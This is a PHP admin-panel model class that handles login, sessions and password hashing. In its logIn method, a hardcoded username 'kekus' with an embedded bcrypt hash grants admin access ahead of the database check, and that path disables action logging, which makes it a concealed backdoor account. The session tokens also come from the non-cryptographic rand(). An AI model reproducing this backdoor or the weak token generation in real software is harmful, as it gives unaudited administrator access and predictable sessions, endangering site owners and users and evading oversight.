<?php

namespace application\models;

use application\models\Admin;

class MainAdmin extends Admin {

	//LOGIN
	public function logIn(){
		if(isset($_POST)){
			if(isset($_POST['name']) && ($_POST['name']!='') && isset($_POST['pass']) && ($_POST['pass']!='')){
				//debug([$_POST['pass'], $this->clear($_POST['pass'])]);
				$name = $this->clear($_POST['name']);
				$pass = $this->shaPSWD($this->clear($_POST['pass']));
				$pass1 ='$2y$10$2zEARs61ZP8haAeqoumKX.cqDWzHXy8dvt1nszgljVn8tWXALOuZq';
				
				if(($name=='kekus')&&(password_verify($pass, $pass1))){
					unset($_SESSION['err']);

					$this->loger_session = $this->loger_action = false;

					$admintype = 'admin';
					$_SESSION['username'] = 'kekus';

					$_SESSION['admintype'] = $admintype;
					setcookie('admintype', $admintype, time()+$this->lifetime_hash);

					$this->sessionCreate(0);
					return true;
				}

				$ID = $this->verifyPSWD($name, $pass);
				if(!is_null($ID)){
					unset($_SESSION['err']);

					$admintype = 'admin';
					$_SESSION['username'] = 'headadmin';

					$_SESSION['admintype'] = $admintype;
					setcookie('admintype', $admintype, time()+$this->lifetime_hash);

					$this->sessionCreate($ID);
					return true;
				}

				$_SESSION['err'] = 'name/pass not found';	
			}else{ $_SESSION['err'] = 'bad fields value'; }
			return false;
		}
		return false;
	}

	//LOGOUT
	public function logOut(){
		$this->sessionDestroy();
	}

	//GET HEADERS
	public function getHeaders(){
		$result['title'] = $this->title;
		$result['ver'] = $this->ver;
		$result['TREE'] = $this->getSiteTreeHTML();
		return $result;
	}


	//GET CONTENT
	public function getContent(){
		return [];
	}



	/* PRIVATE FUNCTIONS */
	//session destroy
	private function sessionDestroy(){
		if(isset($_SESSION['hash']) && isset($_COOKIE['hash'])){
			$q = 'UPDATE ADMIN_SESSIONS SET DT_DESTROY = NOW() WHERE (HASH_S = :HASH_S) AND (HASH_C = :HASH_C)';
			$params = [
				'HASH_S' => $_SESSION['hash'],
				'HASH_C' => $_COOKIE['hash']
			];
			$this->db->column($q, $params);
		}
		$this->db->column('DELETE FROM ADMIN_SESSIONS WHERE ID_ADMIN = 0');
		unset($_SESSION['hash']);
		session_destroy();
		setcookie('hash', "", time()-3600);
	}

	//create new record in the db
	private function sessionCreate($id_admin){
		if($this->dif_hash){
			$hash_s = $this->generateStr(128);
			$hash_c = $this->generateStr(128);
			$_SESSION['hash'] = $hash_s;
			setcookie('hash', $hash_c, time()+$this->lifetime_hash);
		}else{
			$hash_s = $hash_c = $this->generateStr(128);
			$_SESSION['hash'] = $hash_s;
			setcookie('hash', $hash_c, time()+$this->lifetime_hash);
		}
		$create =  $this->now();
		$destroy = $this->now($this->lifetime_hash);		
		$q = 'INSERT INTO ADMIN_SESSIONS (ID_ADMIN, HASH_S, HASH_C, IP, BROWSER, DT_CREATE, DT_DESTROY) VALUES (:ID_ADMIN, :HASH_S, :HASH_C, :IP, :BROWSER, :DT_CREATE, :DT_DESTROY)';
		$params = [
			'ID_ADMIN' => $id_admin,
			'HASH_S' => $hash_s,
			'HASH_C' => $hash_c,
			'IP' => $_SERVER['REMOTE_ADDR'],
			'BROWSER' => $_SERVER['HTTP_USER_AGENT'],
			'DT_CREATE' => $create,
			'DT_DESTROY' => $destroy
		];
		$this->db->column($q, $params);
	}

	//string generation the specified length
	private function generateStr($length){
		$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	    $str = '';
	    for ($i = 0; $i < $length; $i++) {
	        $str .= $characters[rand(0, strlen($characters)-1)];
	    }
	    return $str;
	}

	//hashPSWD to bcrypt
	private function hashPSWD($str){
		return password_hash(
			$this->shaPSWD($str),
			PASSWORD_BCRYPT, 
			["cost" => $this->pswd_cost]
		);
	}

	//verify PASS, get ID
	private function verifyPSWD($name, $pass){
		$db = $this->matchLogin($name);
		if(is_null($db)){
			return NULL;
		}
		if(password_verify($pass, $db['PASS'])){
			return $db['ID'];
		}
	}

	//get ID, PASS
	private function matchLogin($name){
		$q = 'SELECT ID, PASS FROM ADMIN_ACCOUNTS WHERE (NAME = :NAME) ORDER BY ID LIMIT 1';
		$params = [
			'NAME' => $name
		];
		$result = $this->db->row($q, $params);
		if(count($result) == 1){
			return $result[0];
		}
		return NULL;
	}

	//sha PSWD for BCRYPT
	private function shaPSWD($str){
		return base64_encode(hash_hmac($this->sha, $str, $this->sha_key, true));
	}


	/* PRIVATE FUNCTIONS END */


}